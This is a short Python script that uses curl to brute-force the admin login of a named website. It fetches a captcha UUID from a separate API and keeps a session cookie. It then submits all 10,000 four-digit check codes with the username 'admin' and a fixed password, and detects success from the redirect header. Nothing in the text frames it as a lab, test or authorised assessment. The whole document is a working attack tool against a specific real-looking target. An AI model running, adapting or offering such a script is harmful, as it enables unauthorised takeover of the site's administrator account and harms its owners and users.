import subprocess, json, sys

r = subprocess.run(['curl','-sk','https://api.myxypt.com/captcha?width=140&height=48'],
    capture_output=True, text=True, timeout=10)
uuid = json.loads(r.stdout)['data']['uuid']
subprocess.run(['curl','-sk','-c','/tmp/cn_brute.txt','http://chinanaisi.com/admin/login','-o','/dev/null'],timeout=5)
print('UUID:', uuid)

for i in range(10000):
    code = '%04d' % i
    try:
        r = subprocess.run(['curl','-sk','--connect-timeout','2','--max-time','4',
            '-b','/tmp/cn_brute.txt',
            'http://chinanaisi.com/admin/login.php','-X','POST',
            '-d','action=loginpost&uuid='+uuid+'&loginId=&username=admin&password=12345678&checkcode='+code,
            '-H','X-Requested-With: XMLHttpRequest',
            '-A','Mozilla/5.0','-D','-','-o','/dev/null'],
            capture_output=True, text=True, timeout=6)
    except:
        continue
    loc = [l for l in r.stdout.split(chr(10)) if 'Location:' in l]
    if not loc or '/admin/login.php' not in str(loc):
        print('CODE=' + code + ' LOCATION=' + str(loc))
        sys.exit(0)
    if i % 500 == 0:
        print(code + '/10000')

print('NO MATCH')
